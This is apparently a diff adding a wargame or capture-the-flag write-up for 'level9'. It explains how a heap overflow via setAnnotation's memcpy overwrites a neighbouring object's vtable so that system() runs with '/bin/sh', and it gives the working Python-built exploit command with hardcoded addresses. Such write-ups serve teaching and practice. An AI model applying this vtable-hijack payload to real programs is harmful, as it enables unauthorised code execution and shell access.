@@ -1,0 +1,52 @@
+
+	memory representation:
+	
+	B = n;
+
+	n:
+		vtable : B + 0
+		annotation : B + 4
+		value : B + 104 							
+		
+	end of n: 108 bytes															//(1)
+
+		PADDING OF 4
+	m:
+		vtable : B + 112														
+		annotation : B + 116
+		value : B + 216
+
+We can then by using setAnnotation with n,
+	=> memcpy from B + 4 to B + 116,
+
+		=> len of 112 with the 4 last byte as the vtable replacement
+
+		=> overriding an address A (for example vtable address - 4) content by the address of system
+		=> overriding the vtable address of m by the A address
+		=> tweak the rest of m so it launches sh with system as a char *
+
+	=> calling the system function with this last call with m as parameter
+	
+
+thus we:
+
+	override n + 108 (address A = m's vtable - 4) by system call address		//(2)
+	override m vtable by address of n + 108										//(3)
+
+		we just recreated a vtable that has system as 1st function
+
+	override rest of m so it can launch /bin/sh as a char * system parameter
+	as it will be executed with it as first parameter							//(4)
+
+	./level9 "$(python -c "print 'a' * 104 + '\x60\x60\xd8\xb7\x74\xa0\x04\x08 ; /bin/sh'")"
+
+
+	print 'a' * 104 : getting to m's vtable - 4 (starting from B + 4) 	(1)
+
+	\x60\x60\xd8\xb7 (address of system): 								(2)
+	
+	\x74\xa0\x04\x08 (address of n + 108):								(3)
+	
+	; /bin/sh :															(4)
+
+	
